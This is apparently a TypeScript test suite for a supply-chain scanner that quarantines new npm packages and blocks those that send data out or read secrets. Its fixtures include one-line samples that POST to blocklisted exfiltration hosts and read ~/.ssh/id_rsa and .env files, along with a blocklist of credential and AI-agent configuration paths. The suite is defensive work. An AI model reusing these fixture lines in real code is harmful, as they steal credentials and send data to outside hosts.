import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { writeFileSync, mkdirSync, existsSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import {
  preInstallScan,
  scanPackageContent,
  isInQuarantineWindow,
  type PackageMeta,
} from '../src/supply-chain/dependency-attestor.js';
import type { SupplyChainPolicy } from '../src/types.js';

const FIXTURE_DIR = './test-gate-fixtures';
const NODE_MODULES = join(FIXTURE_DIR, 'node_modules');

function makePolicy(overrides?: Partial<SupplyChainPolicy>): SupplyChainPolicy {
  return {
    quarantineWindowHours: 24,
    preinstallHookPolicy: 'blocklist',
    preinstallHookAllowlist: [],
    behavioralDiff: {
      enabled: true,
      newEndpointBlockThreshold: 1,
      sensitivePathBlocklist: [
        '~/.ssh/**', '~/.aws/**', '**/.env', '**/.env.*',
        '~/.claude/**', '~/.cursor/**', '~/.codex/**', '~/.aider/**',
      ],
    },
    exfilDomainBlocklist: ['audit.checkmarx.cx', 'evil.example.com'],
    trustedPublishers: ['@bitwarden', '@orderly-network'],
    lockfileAttestation: { required: true, algorithm: 'sha256' },
    ...overrides,
  };
}

function setupPackage(name: string, files: Record<string, string>, pkgJson?: object): void {
  const pkgDir = join(NODE_MODULES, name);
  mkdirSync(pkgDir, { recursive: true });
  if (pkgJson) {
    writeFileSync(join(pkgDir, 'package.json'), JSON.stringify(pkgJson));
  }
  for (const [filename, content] of Object.entries(files)) {
    const dir = join(pkgDir, ...filename.split('/').slice(0, -1));
    if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
    writeFileSync(join(pkgDir, filename), content);
  }
}

describe('Pre-Install DependencyAttestor', () => {
  beforeEach(() => {
    mkdirSync(NODE_MODULES, { recursive: true });
  });

  afterEach(() => {
    if (existsSync(FIXTURE_DIR)) rmSync(FIXTURE_DIR, { recursive: true, force: true });
  });

  describe('isInQuarantineWindow', () => {
    it('returns true for recently published packages', () => {
      const recent = new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString();
      expect(isInQuarantineWindow(recent, 24)).toBe(true);
    });

    it('returns false for packages older than window', () => {
      const old = new Date(Date.now() - 48 * 60 * 60 * 1000).toISOString();
      expect(isInQuarantineWindow(old, 24)).toBe(false);
    });

    it('returns true when publishedAt is undefined', () => {
      expect(isInQuarantineWindow(undefined, 24)).toBe(true);
    });

    it('returns true for invalid date strings', () => {
      expect(isInQuarantineWindow('not-a-date', 24)).toBe(true);
    });
  });

  describe('scanPackageContent', () => {
    it('detects blocklisted exfil domains', () => {
      setupPackage('exfil-pkg', {
        'index.js': 'fetch("https://audit.checkmarx.cx/collect", { method: "POST" });',
      });
      const policy = makePolicy();
      const result = scanPackageContent(join(NODE_MODULES, 'exfil-pkg'), policy);
      expect(result.domains.length).toBeGreaterThan(0);
    });

    it('detects sensitive path access patterns', () => {
      setupPackage('cred-steal', {
        'steal.js': 'const key = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa");',
      });
      const policy = makePolicy();
      const result = scanPackageContent(join(NODE_MODULES, 'cred-steal'), policy);
      expect(result.sensitiveAccess.length).toBeGreaterThan(0);
    });

    it('detects process.env access', () => {
      setupPackage('env-read', {
        'index.js': 'const token = process.env.SECRET_KEY;',
      });
      const policy = makePolicy();
      const result = scanPackageContent(join(NODE_MODULES, 'env-read'), policy);
      expect(result.sensitiveAccess.length).toBeGreaterThan(0);
    });

    it('detects network call patterns', () => {
      setupPackage('network-pkg', {
        'index.js': 'const res = await fetch("https://example.com/api");',
      });
      const policy = makePolicy();
      const result = scanPackageContent(join(NODE_MODULES, 'network-pkg'), policy);
      expect(result.networkCalls.length).toBeGreaterThan(0);
    });

    it('returns empty results for clean packages', () => {
      setupPackage('clean-pkg', {
        'index.js': 'module.exports = { add: (a, b) => a + b };',
      });
      const policy = makePolicy();
      const result = scanPackageContent(join(NODE_MODULES, 'clean-pkg'), policy);
      expect(result.domains).toHaveLength(0);
      expect(result.sensitiveAccess).toHaveLength(0);
    });
  });

  describe('preInstallScan', () => {
    it('blocks packages in quarantine window', () => {
      const policy = makePolicy();
      const packages: PackageMeta[] = [{
        name: '@bitwarden/cli',
        version: '2026.4.0',
        publishedAt: new Date(Date.now() - 1000 * 60 * 60).toISOString(),
      }];

      const result = preInstallScan(packages, policy, NODE_MODULES);
      expect(result.allowed).toBe(false);
      expect(result.blockedPackages).toContain('@bitwarden/cli');
      expect(result.alerts[0].severity).toBe('critical');
    });

    it('trusted publisher does NOT bypass quarantine (hardcoded invariant)', () => {
      const policy = makePolicy();
      const packages: PackageMeta[] = [{
        name: '@orderly-network/sdk',
        version: '1.0.0',
        publishedAt: new Date(Date.now() - 1000 * 60 * 60).toISOString(),
      }];

      const result = preInstallScan(packages, policy, NODE_MODULES);
      expect(result.allowed).toBe(false);
      expect(result.alerts[0].message).toContain('does NOT bypass quarantine');
    });

    it('blocks packages with exfil domain content', () => {
      setupPackage('evil-dep', {
        'index.js': 'fetch("https://audit.checkmarx.cx/exfil");',
      });
      const policy = makePolicy();
      const packages: PackageMeta[] = [{
        name: 'evil-dep',
        version: '1.0.0',
        publishedAt: new Date(Date.now() - 48 * 60 * 60 * 1000).toISOString(),
      }];

      const result = preInstallScan(packages, policy, NODE_MODULES);
      expect(result.allowed).toBe(false);
      expect(result.alerts.some(a => a.check === 'exfil_domain_blocked')).toBe(true);
    });

    it('blocks packages with sensitive path access', () => {
      setupPackage('ssh-reader', {
        'index.js': 'require("fs").readFileSync(process.env.HOME + "/.ssh/id_rsa");',
      });
      const policy = makePolicy();
      const packages: PackageMeta[] = [{
        name: 'ssh-reader',
        version: '1.0.0',
        publishedAt: new Date(Date.now() - 48 * 60 * 60 * 1000).toISOString(),
      }];

      const result = preInstallScan(packages, policy, NODE_MODULES);
      expect(result.allowed).toBe(false);
      expect(result.alerts.some(a => a.check === 'sensitive_path_access')).toBe(true);
    });

    it('allows clean packages past quarantine', () => {
      setupPackage('safe-dep', {
        'index.js': 'module.exports = { safe: true };',
      });
      const policy = makePolicy();
      const packages: PackageMeta[] = [{
        name: 'safe-dep',
        version: '1.0.0',
        publishedAt: new Date(Date.now() - 48 * 60 * 60 * 1000).toISOString(),
      }];

      const result = preInstallScan(packages, policy, NODE_MODULES);
      expect(result.allowed).toBe(true);
      expect(result.blockedPackages).toHaveLength(0);
    });

    it('skips behavioral diff when disabled', () => {
      setupPackage('exfil-but-allowed', {
        'index.js': 'fetch("https://audit.checkmarx.cx/data");',
      });
      const policy = makePolicy({ behavioralDiff: { enabled: false, newEndpointBlockThreshold: 1, sensitivePathBlocklist: [] } });
      const packages: PackageMeta[] = [{
        name: 'exfil-but-allowed',
        version: '1.0.0',
        publishedAt: new Date(Date.now() - 48 * 60 * 60 * 1000).toISOString(),
      }];

      const result = preInstallScan(packages, policy, NODE_MODULES);
      expect(result.allowed).toBe(true);
    });

    it('detects .env access pattern', () => {
      setupPackage('env-stealer', {
        'postinstall.js': 'const data = require("fs").readFileSync(".env", "utf-8");',
      });
      const policy = makePolicy();
      const packages: PackageMeta[] = [{
        name: 'env-stealer',
        version: '1.0.0',
        publishedAt: new Date(Date.now() - 48 * 60 * 60 * 1000).toISOString(),
      }];

      const result = preInstallScan(packages, policy, NODE_MODULES);
      expect(result.allowed).toBe(false);
    });

    it('emits supply-chain source alerts for all blocks', () => {
      const policy = makePolicy();
      const packages: PackageMeta[] = [{
        name: 'quarantined',
        version: '0.0.1',
        publishedAt: new Date().toISOString(),
      }];

      const result = preInstallScan(packages, policy, NODE_MODULES);
      for (const alert of result.alerts) {
        expect(alert.source).toBe('supply-chain');
      }
    });
  });
});
